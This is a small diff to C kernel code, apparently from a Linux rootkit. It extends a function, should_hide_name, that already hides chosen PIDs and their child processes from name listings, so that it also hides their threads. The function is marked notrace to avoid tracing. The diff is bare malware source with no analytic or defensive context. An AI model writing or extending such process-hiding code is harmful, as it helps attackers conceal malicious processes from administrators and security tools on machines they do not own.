@@ -33,7 +33,7 @@ static notrace bool should_hide_name(const char *name)
     if (kstrtoint(name, 10, &pid) < 0)
         return false;
 
-    if (is_hidden_pid(pid) || is_child_pid(pid))
+    if (is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid))
         return true;
 
     return false;
